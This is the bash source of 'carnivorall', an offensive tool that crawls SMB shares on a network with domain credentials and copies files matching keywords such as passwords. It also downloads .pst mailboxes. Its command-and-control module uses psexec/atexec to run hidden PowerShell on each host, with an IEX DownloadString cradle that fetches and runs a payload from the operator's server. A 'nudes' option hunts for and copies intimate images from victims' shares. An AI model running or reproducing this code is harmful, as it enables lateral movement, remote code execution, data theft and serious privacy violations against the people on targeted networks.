#!/bin/bash
#===========================================================================================================
# Title           :carnivorall.sh
# Description     :Look for sensitive information on the internal network.
# Authors         :L0stControl and BFlag
# Date            :2018/10/15
# Version         :1.0.0
# Dependecies     :cifs-utils / smbclient / GhostScript / zip / ruby (nokogiri / httparty / colorize / yara 
#===========================================================================================================

SCRIPTHOME=$(readlink -f "$0" | rev | cut -d '/' -f 2- | rev)
export PATH=$PATH:$SCRIPTHOME

function banner {
    cat << EOF
    
  ================================================================================================

   ▄████▄   ▄▄▄       ██▀███   ███▄    █  ██▓ ██▒   █▓ ▒█████   ██▀███   ▄▄▄       ██▓     ██▓    
  ▒██▀ ▀█  ▒████▄    ▓██ ▒ ██▒ ██ ▀█   █ ▓██▒▓██░   █▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    ▓██▒    ▓██▒    
  ▒▓█    ▄ ▒██  ▀█▄  ▓██ ░▄█ ▒▓██  ▀█ ██▒▒██▒ ▓██  █▒░▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  ▒██░    ▒██░    
  ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██▀▀█▄  ▓██▒  ▐▌██▒░██░  ▒██ █░░▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ ▒██░    ▒██░    
  ▒ ▓███▀ ░ ▓█   ▓██▒░██▓ ▒██▒▒██░   ▓██░░██░   ▒▀█░  ░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒░██████▒░██████▒
  ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ ░▓     ░ ▐░  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▓  ░
    ░  ▒     ▒   ▒▒ ░  ░▒ ░ ▒░░ ░░   ░ ▒░ ▒ ░   ░ ░░    ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░
  ░          ░   ▒     ░░   ░    ░   ░ ░  ▒ ░     ░░  ░ ░ ░ ▒    ░░   ░   ░   ▒     ░ ░     ░ ░   
  ░ ░            ░  ░   ░              ░  ░        ░      ░ ░     ░           ░  ░    ░  ░    ░  ░
  ░                                               ░                                               

  ================================================================================================             
                --=={ Looking for sensitive information on local network }==--                                  

    Usage: ./carnivorall.sh [options]
    
        -n, --network <CIDR>                        192.168.0.0/24
        -l, --list <inputfilename>                  List of hosts/networks
        -d, --domain <domain>                       Domain network
        -u, --username <guest>                      Domain username 
        -p, --password <guest>                      Domain password
        -o, --only <contents|filenames|yara|regex>  Search ONLY by sensitve contents, filenames or yara rules
        -m, --match "user passw senha"              Strings to match inside files (not default)
        -r, --regex "4[0-9]{12}[0-9]?{3}"           Search contents using REGEX
        -y, --yara <juicy_files.txt>                Enable Yara search patterns (not default)
        -e, --emails <y|n>                          Download all *.pst files (Prompt by default) 
        -D, --delay <Number>                        Delay between requests
       -lD, --localfolder /path/                    For search sensitive information in local files  
        -h, --help                                  Display options
        -g, --google <max items>                    Search files on the website using Google (Obs: Set to "0" to search in local files)
        -w, --website "domain.com"                  Website used at *-g/--google* feature
        -v, --verbose no                            Display all matches at run time (default yes)
        
        Ex1: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY  
        Ex2: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -o filenames
        Ex3: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -o yara -y juicy_files.txt

        -={ Command & Control Module }=-

        -lH, --lhost 192.168.0.1                     Local ip to receive zombies responses
        -lP, --lport 80                              Local port to listen
        -pP, --pspayload <payload.ps1>               Powershell payload file
        -mT, --method atexec                         Use atexec.py (Default psexec.py from Impacket)

        Ex4: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -lH 192.168.1.2 -pP ./payload.ps1 -lP 80 
        Ex5: ./carnivorall -lH 192.168.1.2 -lP 80 # Listen mode. 

EOF
}

#----------------#
# Options parser #
#----------------#

if [ "$1" == "-h" -o "$1" == "--help" -o -z "$1" ]; then 
    banner
    exit
fi

POSITIONAL=()
while [[ $# -gt 0 ]]
do
KEY="$1"

case $KEY in
    -n|--network)
    NETWORK="$2"
    shift 
    shift 
    ;;
    -d|--domain)
    DOMAIN="$2"
    shift 
    shift 
    ;;
    -u|--username)
    USERNAME="$2"
    shift 
    shift 
    ;;
    -p|--password)
    PASSWORD="$2"
    shift 
    shift 
    ;;
    -D|--delay)
    DELAY="$2"
    shift 
    shift 
    ;;
    -m|--match)
    PATTERNMATCH="$2"
    shift 
    shift 
    ;;
    -r|--regex)
    REGEX="$2"
    shift 
    shift 
    ;;
    -y|--yara)
    YARAFILE="$2"
    shift 
    shift 
    ;;
    -g|--google)
    GOOGLE="$2"
    shift 
    shift 
    ;;
    -w|--website)
    WEBSITE="$2"
    shift 
    shift 
    ;;
    -e|--emails)
    EMAILS="$2"
    shift
    shift
    ;;
    -l|--list)
    LISTHOSTS="$2"
    shift
    shift
    ;;
    -o|--only)
    ONLY="$2"
    shift 
    shift 
    ;;
    -lH|--lhost)
    LHOST="$2"
    shift 
    shift 
    ;;
    -lD|--localfolder)
    LFOLDER="$2"
    shift 
    shift 
    ;;
    -pP|--pspayload)
    PSPAYLOAD="$2"
    shift 
    shift 
    ;;
    -v|--verbose)
    VERBOSE="$2"
    shift 
    shift 
    ;;
    -lP|--lport)
    LPORT="$2"
    shift 
    shift 
    ;;
    -mT|--method)
    METHOD="$2"
    shift 
    shift 
    ;;
    -xxx|--nudes)
    XXX="$2"
    shift 
    shift 
    ;;
    --default)
    DEFAULT=YES
    shift 
    ;;
    *)    
    POSITIONAL+=("$1") # save it in an array for later
    shift # past argument
    ;;
esac
done
set -- "${POSITIONAL[@]}" # restore positional parameters

function getConfs {
    CONFIG=$(echo "$SCRIPTHOME/carnivorall.conf")
    grep "^[^#;]" $CONFIG > /tmp/carnivorall.conf.tmp
    OPTION=$(envsubst < /tmp/carnivorall.conf.tmp | grep $1 |awk -F"=" '{print $2}' )
    echo $OPTION
    rm -rf /tmp/carnivorall.conf.tmp
}

#-------------------------#
# Constants and variables #
#-------------------------#

NETWORK="${NETWORK:=notset}"
LISTHOSTS="${LISTHOSTS:=notset}"
DOMAIN="${DOMAIN:=notset}"
USERNAME="${USERNAME:=notset}"
PASSWORD="${PASSWORD:=notset}"
YARAFILE="${YARAFILE:=notset}"
ONLY="${ONLY:=notset}"
DELAY="${DELAY:=$(getConfs DELAY)}"
EMAILS="${EMAILS:=0}"
REGEX="${REGEX:=notset}"
PATTERNMATCH="${PATTERNMATCH:=$(getConfs PATTERNMATCH)}"
PIDCARNIVORALL=$$
GOOGLE="${GOOGLE:=notset}"
WEBSITE="${WEBSITE:=notset}"
LHOST="${LHOST:=notset}"
PSPAYLOAD="${PSPAYLOAD:=notset}"
LPORT="${LPORT:=$(getConfs LPORT)}"
LFOLDER="${LFOLDER:=notset}"
VERBOSE="${VERBOSE:=$(getConfs VERBOSE)}"
MOUNTPOINT=$(getConfs MOUNTPOINT)
PSEXEC=$(getConfs PSEXEC)
METHOD="${METHOD:=$(getConfs PSEXEC)}"
XXX="${XXX:=notset}"
SHARESFILE=~/.carnivorall/shares.txt
FILESFOLDER=$(getConfs FILESFOLDER)
SMB=$(whereis smbclient |awk '{print $2}')
CIFS=$(whereis cifscreds |awk '{print $2}')
MNT=$(whereis mount |awk '{print $2}')
UMNT=$(whereis umount |awk '{print $2}')
YARA=$(whereis yara |awk '{print $2}')
GSCRIPT=$(whereis gs |awk '{print $2}')
RUBY=$(whereis ruby |awk '{print $2}')
LOG=$(getConfs LOG)
SHARES=""
DEFAULTCOLOR="\033[0m"
BLACK="\033[0;30m"
RED="\033[0;31m"
GREEN="\033[0;32m"
WHITE="\033[1;37m"
MAGENTA="\033[1;35m"
YELLOW="\033[0;33m"
BLUE="\033[0;34m"
EXITCTRL=0
DEPGEMS=("nokogiri" "httparty" "colorize" "sinatra")

#-----------#
# Functions #
#-----------#

function checkDependencies
{
    EXIT=0

    if ! [[ ${CIFS: -9} =~ "cifscreds" ]] ; then
        echo -e "\n$RED [!] Dependecies error, you need to install$YELLOW cifs-utils$RED package $DEFAULTCOLOR\n"
        EXIT=1
    fi    
    
    if ! [[ ${SMB: -9} =~ "smbclient" ]] ; then
        echo -e "\n$RED [!] Dependecies error, you need to install$YELLOW smbclient$RED package $DEFAULTCOLOR\n"
        EXIT=1
    fi

    if ! [[ ${GSCRIPT: -2} =~ "gs" ]] ; then
        echo -e "\n$RED [!] Dependecies error, you need to install$YELLOW ghostscript$RED package $DEFAULTCOLOR\n"
        EXIT=1
    fi

    if ! [[ ${RUBY} =~ "ruby" ]] ; then
        echo -e "\n$RED [!] Dependecies error, you need to install$YELLOW ruby$RED package $DEFAULTCOLOR\n"
        EXIT=1
    fi

    RUBYGEMS=$(gem list --local)
    
    for GEM in "${DEPGEMS[@]}"
    do
        if ! ( echo $RUBYGEMS | grep -i $GEM ) > /dev/null 2>&1 ; then
            echo -e "\n$RED [!] Ruby dependecies error, please type$YELLOW gem install $GEM $DEFAULTCOLOR"
            EXIT=1
        fi
    done

    if [ $EXIT -eq 1 ]; then
        echo
        exit
    fi 
}

function checkHomeFolders
{
    if [ ! -d ~/.carnivorall ]; then
        mkdir -p ~/.carnivorall 
        mkdir -p $FILESFOLDER 
        mkdir -p $MOUNTPOINT 
        touch $SHARESFILE 
        touch $LOG 
    fi    
}

function dateLog
{ 
    MSG=$1
    echo >> $LOG
    echo " ----------------------------" >> $LOG
    echo " "$(date) >> $LOG
    echo " ----------------------------" >> $LOG
    echo " $MSG" >> $LOG 
}

function listShares 
{
    HOSTSMB=$1
    USERNAME=$2
    PASSWORD=$3
    DOMAIN=$4
    exec 2> /dev/null # GoHorse to clean the outputs
    SHARES=$($SMB -g -L \\\\$HOSTSMB $OPTIONS |grep -i "Disk" |grep -v "print")
    SHARES=$(echo $SHARES |grep -i "Disk")
    exec 1> /dev/tty # GoHorse to clean the outputs 
}

function checkReadableShare 
{
    HOSTSMB=$1
    PATHSMB=$2
    if $SMB \\\\$HOSTSMB\\$PATHSMB $OPTIONS -c ls 2>&1 > /dev/null ; then
        echo "True"
    else
        echo "False"
    fi
}

function scanner
{
    HOSTS=$1
    echo 1 > /dev/shm/holdcarnivorall 2> /dev/null # Using shared memory to avoid sync problems
    chmod -f 777 /dev/shm/holdcarnivorall 
    echo -e "$WHITE [-] Scanning $HOSTS $DEFAULTCOLOR"
    listShares $HOSTS $USERNAME $PASSWORD $DOMAIN
    for i in $SHARES; do
        PATHSMB=$(echo $i |awk -F"|" '{print $2}')
        READABLE=$(checkReadableShare $HOSTS $PATHSMB |tail -n1)
        if [ "$READABLE" == "True" ];then 
            printf "%-45s %-20s \n" " [+] smb://$HOSTS/$PATHSMB/" "| READ |"
            echo "$HOSTS,$PATHSMB" >> $SHARESFILE
        fi
    done
    echo 0 > /dev/shm/holdcarnivorall # Using shared memory to avoid sync problems
    SHARES=""
}

function generateTargets
{
    > $SHARESFILE # Clean targets file
    if [ "$LISTHOSTS" != "notset" ]; then
        readarray -t IPS_FILE <<< "$(cat $LISTHOSTS | while read LINE ; do generateRange.rb $LINE; done)"
        for HOSTS in "${IPS_FILE[@]}"
            do
                scanner $HOSTS &
                sleep $DELAY
            done 
    elif [ "$NETWORK" != "notset" ]; then
        readarray -t IPS <<< "$(generateRange.rb $NETWORK)"
        for HOSTS in "${IPS[@]}"
        do
            scanner $HOSTS &
            sleep $DELAY
        done
    else
        echo -e "\n$RED [!] ERROR: $YELLOW Sintax error \n$DEFAULTCOLOR"
        exit
    fi   
}

function searchFilesByName
{
    HOSTSMB=$1
    PATHSMB=$2
    echo -e "\n$WHITE [+] Looking for suspicious filenames on smb://$HOSTSMB/$PATHSMB"
    echo -e "$DEFAULTCOLOR"
    if [ ! -d $FILESFOLDER/$HOSTSMB\_$PATHSMB ]; then
        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB 2>&1 > /dev/null
    fi

    for p in $PATTERNMATCH
    do
        find $MOUNTPOINT -type f \( -iname "*"$p"*" -o -iname "$p*" \) -printf '%p\n' -exec cp --backup=numbered {} \
        $FILESFOLDER/$HOSTSMB\_$PATHSMB \; |while read OUTPUTS 
        do
            NEWOUTPUT=$(echo $OUTPUTS | sed "s/^.\{,${#MOUNTPOINT}\}/$HOSTSMB\/$PATHSMB/")
            echo -e "$GREEN [+]$WHITE - File copied $NEWOUTPUT $DEFAULTCOLOR" |tee -a $LOG
        done
    done
    
    if [ ! "$(ls -A $FILESFOLDER/$HOSTSMB\_$PATHSMB/* 2> /dev/null)" ];then
        rm -rf $FILESFOLDER/$HOSTSMB\_$PATHSMB/
    fi
}

function searchFilesByContent
{
    HOSTSMB=$1
    PATHSMB=$2
    echo -e "\n$WHITE [+] Looking for suspicious content files in smb://$HOSTSMB/$PATHSMB"
    echo -e "$DEFAULTCOLOR"
    if [ ! -d $FILESFOLDER/$HOSTSMB\_$PATHSMB ]; then
        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB  
        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp 
    fi
  
    find $MOUNTPOINT -type f -exec checkFiles.sh {} "$PATTERNMATCH" $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp \
    $FILESFOLDER/$HOSTSMB\_$PATHSMB/ $LOG smb://$HOSTSMB/$PATHSMB/{} $MOUNTPOINT $VERBOSE \;

    echo -en "\033[K\r"

    if [ ! "$(ls -A $FILESFOLDER/$HOSTSMB\_$PATHSMB/* 2> /dev/null)" ];then
        rm -rf $FILESFOLDER/$HOSTSMB\_$PATHSMB/
    fi
}

function searchFilesByRegex
{
    HOSTSMB=$1
    PATHSMB=$2
    echo -e "\n$WHITE [+] Looking for suspicious content files using REGEX $REGEX on smb://$HOSTSMB/$PATHSMB"
    echo -e "$DEFAULTCOLOR"
    if [ ! -d $FILESFOLDER/$HOSTSMB\_$PATHSMB ]; then
        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB  
        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp 
    fi
    
    find $MOUNTPOINT -type f -exec checkRegex.sh {} "$REGEX" $FILESFOLDER/$HOSTSMB\_$PATHSMB/tmp $FILESFOLDER/$HOSTSMB\_$PATHSMB/ \
    $LOG smb://$HOSTSMB/$PATHSMB $MOUNTPOINT $VERBOSE \;

    echo -en "\033[K\r"

    if [ ! "$(ls -A $FILESFOLDER/$HOSTSMB\_$PATHSMB/* 2> /dev/null)" ];then
        rm -rf $FILESFOLDER/$HOSTSMB\_$PATHSMB/
    fi
    echo
}

function umountTarget
{
    $UMNT -l -f $MOUNTPOINT
    trap 2 # Enable Ctrl-C
}

function exitScan 
{
    echo -e "\n$RED............Scan stopped! keep hacking =)$DEFAULTCOLOR"
    umountTarget
    kill -9 $PIDCARNIVORALL     
}

function mountTarget
{
    HOSTSMB=$1
    PATHSMB=$2
    if [ $(id -u) -ne 0 ];then
        echo -e "\n$RED  You must be root to use this options =( $DEFAULTCOLOR \n"
        exit
    else
        $MNT -t cifs //$HOSTSMB/$PATHSMB $MOUNTPOINT $OPTIONSMNT
        trap exitScan 2 # Disable Ctrl-C   
    fi    
}

function searchFilesWithYara
{
    JUICE=$1
    echo -e "\n$GREEN [+]$WHITE Searching sensitive information with Yara smb://$HOSTSMB/$PATHSMB $DEFAULTCOLOR"
    $YARA -r $JUICE $MOUNTPOINT |tee -a $LOG
}

function searchFilesWithGoogle
{
    if [ ! -d $FILESFOLDER/$WEBSITE ]; then
        mkdir -p $FILESFOLDER/$WEBSITE/downloads
        mkdir -p $FILESFOLDER/$WEBSITE/tmp
    fi

    scraping.rb $WEBSITE $GOOGLE $FILESFOLDER/$WEBSITE/downloads

    if [ $REGEX != "notset" ]; then
        echo -e "\n$WHITE [+] Looking for suspicious content in downloaded files from $WEBSITE using REGEX $REGEX $DEFAULTCOLOR\n"
        find $FILESFOLDER/$WEBSITE/downloads -type f -exec checkRegex.sh {} "$REGEX" $FILESFOLDER/$WEBSITE/tmp \
        $FILESFOLDER/$BASENAME/ $LOG $MOUNTPOINT 0 $VERBOSE \;
        echo -en "\033[K\r"

    else

        echo -e "\n$WHITE [+] Looking for suspicious content in downloaded files from $WEBSITE $DEFAULTCOLOR\n"
        find $FILESFOLDER/$WEBSITE/downloads -type f -exec checkFiles.sh {} "$PATTERNMATCH" $FILESFOLDER/$WEBSITE/tmp \
        $FILESFOLDER/$WEBSITE/ $LOG /{} 0 $VERBOSE \;
        echo -en "\033[K\r"
    
    fi
}

function executePowerShell
{
    HOSTSMB=$1
    USERNAME=$2
    PASSWORD=$3
    DOMAIN=$4
    SERVERCEC=$5
    PORTCEC=$6
    sleep 1 

    if [ $METHOD == "atexec" ] ; then
        METHOD=$(getConfs ATEXEC)
    fi

    ENCODEDCMD="IEX (New-Object Net.WebClient).DownloadString('http://$SERVERCEC:$PORTCEC/ps.ps1')"    
    $METHOD "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$HOSTSMB" "powershell.exe -NoPr -NonI -Sta -W Hidden $ENCODEDCMD" 2>&1 > /dev/null
}

function startZombies
{
    > $SHARESFILE # Clean targets file
    if [ "$LISTHOSTS" != "notset" ]; then
        readarray -t IPS_FILE <<< "$(cat $LISTHOSTS | while read LINE ; do generateRange.rb $LINE; done)"
        for HOSTS in "${IPS_FILE[@]}"
            do
                executePowerShell $HOSTS $USERNAME $PASSWORD $DOMAIN $LHOST $LPORT 2>&1 > /dev/null &
                sleep $DELAY
            done 
    else
        readarray -t IPS <<< "$(generateRange.rb $NETWORK)"
        for HOSTS in "${IPS[@]}"
        do
            executePowerShell $HOSTS $USERNAME $PASSWORD $DOMAIN $LHOST $LPORT 2>&1 > /dev/null &
            sleep $DELAY
        done
    fi   
}

function exitZombies
{
    echo -e "\n$RED............Process stopped! keep hacking =)$DEFAULTCOLOR"
    sleep 2
    kill -9 $PIDCARNIVORALL
}

function searchLocalFilesByName
{
    LOCALFOLDER=$1
    BASENAME=$(basename $LOCALFOLDER)
    echo -e "\n$WHITE [+] Looking for suspicious filenames on $LOCALFOLDER"
    echo -e "$DEFAULTCOLOR"
    if [ ! -d $FILESFOLDER/$BASENAME ]; then
        mkdir $FILESFOLDER/$BASENAME 2>&1 > /dev/null
    fi
    for p in $PATTERNMATCH
    do
        find $LOCALFOLDER \( -iname "*"$p"*" -o -iname "$p*" \) -printf '%p\n' -type f -exec cp --backup=numbered {} \
        $FILESFOLDER/$BASENAME \; |while read OUTPUTS 
        do
            echo -e "$GREEN [+]$WHITE - File copied $OUTPUTS $DEFAULTCOLOR" |tee -a $LOG
        done

    done
    
    if [ ! "$(ls -A $FILESFOLDER/$BASENAME/* 2> /dev/null)" ];then
        rm -rf $FILESFOLDER/$BASENAME/
    fi
}

function searchLocalFilesByContent
{
    LOCALFOLDER=$1
    BASENAME=$(basename $LOCALFOLDER)
    echo -e "\n$WHITE [+] Looking for suspicious content files in $LOCALFOLDER"
    echo -e "$DEFAULTCOLOR"
    if [ ! -d $FILESFOLDER/$BASENAME ]; then
        mkdir $FILESFOLDER/$BASENAME
        mkdir $FILESFOLDER/$BASENAME/tmp 
    fi

    find $LOCALFOLDER -type f -exec checkFiles.sh {} "$PATTERNMATCH" $FILESFOLDER/$BASENAME/tmp $FILESFOLDER/$BASENAME/ \
    $LOG $BASENAME/{} $BASENAME $VERBOSE \;

    echo -en "\033[K\r"

    if [ ! "$(ls -A $FILESFOLDER/$BASENAME/* 2> /dev/null)" ];then
        rm -rf $FILESFOLDER/$BASENAME/
    fi
}

function searchLocalFilesWithYara
{
    JUICE=$1
    LOCALFOLDER=$2
    echo -e "\n$GREEN [+]$WHITE Searching sensitive information with Yara $LOCALFOLDER"
    echo -e "$DEFAULTCOLOR"
    $YARA -r $JUICE $LOCALFOLDER |tee -a $LOG
}

function searchLocalFilesByRegex
{
    LOCALFOLDER=$1
    BASENAME=$(basename $LOCALFOLDER)
    echo -e "\n$WHITE [+] Looking for suspicious content files using REGEX $REGEX on $LOCALFOLDER $DEFAULTCOLOR"

    if [ ! -d $FILESFOLDER/$BASENAME ]; then
        mkdir $FILESFOLDER/$BASENAME
        mkdir $FILESFOLDER/$BASENAME/tmp 
    fi
    
    find $LOCALFOLDER -type f -exec checkRegex.sh {} "$REGEX" $FILESFOLDER/$BASENAME/tmp \
    $FILESFOLDER/$BASENAME/ $LOG $MOUNTPOINT 0 $VERBOSE \;

    echo -en "\033[K\r"

    if [ ! "$(ls -A $FILESFOLDER/$BASENAME/* 2> /dev/null)" ];then
        rm -rf $FILESFOLDER/$BASENAME/
    fi
    echo
}

function searchNudes
{
    HOSTSMB=$1
    PATHSMB=$2
    xxx.sh
    echo -e "\n$WHITE [+] Looking for Nud35 on smb://$HOSTSMB/$PATHSMB"
    echo -e "$DEFAULTCOLOR"
    if [ ! -d $FILESFOLDER/$HOSTSMB\_$PATHSMB/xxx ]; then
        mkdir $FILESFOLDER/$HOSTSMB\_$PATHSMB/xxx 2>&1 > /dev/null
    fi

    find $MOUNTPOINT -type f \( -iname "*.jpg" -o -iname "*.jpeg" \) > /tmp/jpegs.txt
    cat /tmp/jpegs.txt |while read LINES
    do
      RESULT=$(/usr/bin/node xxx/xxx.js "$LINES")
        if [ $RESULT == "true" ]; then
          echo -e " [+]$RED HIGH PUSSYBILITY!$DEFAULTCOLOR => $( basename "$LINES" ) "
          #echo -e " [+]$RED HIGH PUSSYBILITY!$DEFAULTCOLOR => "$LINES
          cp "$LINES" $FILESFOLDER/$HOSTSMB\_$PATHSMB/xxx 
        else
          echo -en "$GREEN Checking file => $DEFAULTCOLOR$( basename "$LINES") \033[K\r"
          #echo -en "$GREEN Checking file => $DEFAULTCOLOR "$LINES" \033[K\r"
        fi
    done
    echo "" 
}


#------#
# main #
#------#

checkDependencies

if [ "$NETWORK" == "notset" -a "$LISTHOSTS" == "notset" -a "$GOOGLE" == "notset" -a "$LFOLDER" == "notset" -a "$LPORT" == "notset" ];then
    banner
    echo -e "\n$RED [!] ERROR: $YELLOW Syntax error! Please review the options. $DEFAULTCOLOR\n"
    exit
elif [ "$LISTHOSTS" != "notset" -a ! -e "$LISTHOSTS" ];then
    banner
    echo -e "\n$RED [!] ERROR: $YELLOW File with IP addresses does not exist $DEFAULTCOLOR\n"
    exit
elif [ "$GOOGLE" != "notset" -a "$WEBSITE" == "notset" ]; then
    banner
    echo -e "\n$RED [!] ERROR: $YELLOW You need to inform the website $DEFAULTCOLOR"
    echo -e "        $YELLOW Sintax example:$GREEN carnivorall -g 100 -w example.com $DEFAULTCOLOR \n"
    exit
fi

if [ "$USERNAME" == "notset" -o $PASSWORD == "notset" ]; then
    OPTIONS="-N"
    OPTIONSMNT="-o user=,password="
else
    OPTIONS="-U $DOMAIN\\$USERNAME%$PASSWORD"
    OPTIONSMNT="-o user=$USERNAME,password=$PASSWORD,workgroup=$DOMAIN"
fi 

if [ "$EMAILS" == "y" ];then
    echo 1 > /tmp/pstdefault
    chmod -f 777 /tmp/pstdefault
    elif [ "$EMAILS" == "n" ];then
    echo 2 > /tmp/pstdefault
    chmod -f 777 /tmp/pstdefault
    else
    echo 0 > /tmp/pstdefault
    chmod -f 777 /tmp/pstdefault
fi

if [ $GOOGLE != "notset" -a $LHOST == "notset" ]; then

    dateLog
    echo " Using Google to find files" >> $LOG
    searchFilesWithGoogle
    exit

elif [ $GOOGLE == "notset" -a $LHOST != "notset" ]; then

    if [ "$PSPAYLOAD" != "notset" -a "$NETWORK" != "notset" ]; then
        if [ ! -e "$PSPAYLOAD" ];then
            echo -e "$RED [!] ERROR: $YELLOW File does not exist $DEFAULTCOLOR"
        else
            startZombies &
            trap exitZombies 2 # Disable Ctrl-C
            cec.rb "$LHOST" "$PSPAYLOAD" "$PATTERNMATCH" "$FILESFOLDER" "$LPORT"
        fi
    else
        cec.rb "$LHOST" "$PSPAYLOAD" "$PATTERNMATCH" "$FILESFOLDER" "$LPORT"
    fi
    exit

elif [ $LFOLDER != "notset" ]; then

    if [ ! -d "$LFOLDER" ]; then
        echo -e "$RED [!] ERROR: $YELLOW Directory does not exist $DEFAULTCOLOR"
        exit
    else

        if [ $ONLY == "filenames" ]; then
            dateLog
            searchLocalFilesByName $LFOLDER
            exit
        elif [ $ONLY == "contents" ]; then
            dateLog
            searchLocalFilesByContent $LFOLDER
            exit
        elif [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $YARAFILE != "notset" \) ] ; then
            searchLocalFilesWithYara $YARAFILE $LFOLDER
            exit
        elif [ \( $ONLY == "regex" -a $REGEX != "notset" \) -o \( $REGEX != "notset" \) ] ; then
            dateLog
            searchLocalFilesByRegex $LFOLDER
            exit
        else
            dateLog
            searchLocalFilesByName $LFOLDER
            searchLocalFilesByContent $LFOLDER
            exit
        fi         
    fi 

else
    checkHomeFolders
    generateTargets
fi

while [ $(</dev/shm/holdcarnivorall) -eq 1 ]
do
    sleep 1
done
echo
if [ -s "$SHARESFILE" ];then
    NUMBERLINESFILE=$(cat $SHARESFILE |wc -l)
    COUNT=1
    while :
    do
       echo -e "$YELLOW Choose your option $WHITE"
       echo 0 > /tmp/pstdefault
       echo
       cat $SHARESFILE |while read LINES
       do
           SMBLINE=$(echo $LINES |awk -F"," '{print "smb://"$1"/"$2}')
           echo -e " ( $COUNT ).... $SMBLINE"
           COUNT=$(($COUNT + 1))
       done
       echo -e "$DEFAULTCOLOR ( a ).... Look for files in all targets"
       if [ $REGEX != "notset" ] ; then
           echo -e "$DEFAULTCOLOR ( c ).... Change REGEX pattern, current =$RED $REGEX $DEFAULTCOLOR"
       else 
           echo -e "$DEFAULTCOLOR ( c ).... Change pattern match(es) string(s), current = $RED[ $PATTERNMATCH ]$DEFAULTCOLOR"
       fi
       echo -e "$DEFAULTCOLOR ( r ).... Rescan target(s)"       
       echo -e " ( q ).... Quit" 
       echo
       echo -en " Option ......................: "
       read OPT
       echo -e "$DEFAULTCOLOR"
       
       case $OPT in
       "a")
           dateLog
           for (( T=1; T <= $NUMBERLINESFILE; T++)) 
           do
               TARGETHOST=$(awk "NR==$T" $SHARESFILE|awk -F"," '{print $1}')
               TARGETPATH=$(awk "NR==$T" $SHARESFILE|awk -F"," '{print $2}')
               mountTarget $TARGETHOST $TARGETPATH
           
               if [ $ONLY == "filenames" ];then
                   searchFilesByName $TARGETHOST $TARGETPATH

               elif [[ $XXX != "notset" ]]; then
                   searchNudes $TARGETHOST $TARGETPATH
               
               elif [ \( $ONLY == "regex" -a $REGEX != "notset" \) -o \( $REGEX != "notset" \) ] ; then
                   searchFilesByRegex $TARGETHOST $TARGETPATH

               elif [ $ONLY == "contents" ];then
                   searchFilesByContent $TARGETHOST $TARGETPATH
                 
               elif [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $YARAFILE != "notset" \) ] ; then 
                   searchFilesWithYara $YARAFILE
                              
               else
                   searchFilesByName $TARGETHOST $TARGETPATH
                   searchFilesByContent $TARGETHOST $TARGETPATH           
               fi  
               umountTarget
           done
           continue
           ;;
       "q")
           exit
           ;;
       "c")
           if [ $REGEX != "notset" ] ; then
               echo -en "$YELLOW Type new REGEX ...: $WHITE"
               echo -en "$DEFAULTCOLOR"
               read -r REGEX
               echo
           else
               echo -en "$YELLOW Type new pattern matches separated by spaces ...: $WHITE"
               echo -en "$DEFAULTCOLOR"
               read PATTERNMATCH
               echo
           fi
           ;;
       "r")
           generateTargets
           sleep 3
           ;;
       *)
           dateLog
           TARGETHOST=$(awk "NR==$OPT" $SHARESFILE|awk -F"," '{print $1}')
           TARGETPATH=$(awk "NR==$OPT" $SHARESFILE|awk -F"," '{print $2}')
           mountTarget $TARGETHOST $TARGETPATH
           
           if [ $ONLY == "filenames" ];then
               searchFilesByName $TARGETHOST $TARGETPATH

           elif [[ $XXX != "notset" ]]; then
               searchNudes $TARGETHOST $TARGETPATH

           elif [ \( $ONLY == "regex" -a $REGEX != "notset" \) -o \( $REGEX != "notset" \) ] ; then
               searchFilesByRegex $TARGETHOST $TARGETPATH
           
           elif [ $ONLY == "contents" ];then
               searchFilesByContent $TARGETHOST $TARGETPATH           
           
           elif [ \( $ONLY == "yara" -a $YARAFILE != "notset" \) -o \( $YARAFILE != "notset" \) ] ; then
               searchFilesWithYara $YARAFILE
           
           else
               searchFilesByName $TARGETHOST $TARGETPATH
               searchFilesByContent $TARGETHOST $TARGETPATH           
           fi         
           umountTarget
           trap 2
           continue
           ;;
       esac
    done
fi
